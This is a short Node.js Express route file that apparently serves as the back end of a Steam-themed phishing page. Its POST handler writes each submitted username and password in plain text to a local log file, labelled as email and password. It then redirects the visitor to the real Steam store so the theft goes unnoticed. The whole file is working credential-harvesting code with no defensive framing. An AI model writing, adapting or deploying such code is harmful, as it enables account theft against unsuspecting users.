'use strict';
var express = require('express');
var fs = require('fs');

var writer = fs.createWriteStream('output.txt', { flags: "a" });
var router = express.Router();

/* POST login listing. */
router.post('/', function (req, res) {

    writer.write((new Date()).toISOString() +
        ": [Email]: " + req.body.username + 
        " [Password]: " + req.body.password + "\n");

    res.redirect('https://store.steampowered.com/');
    res.end()
});

module.exports = router;
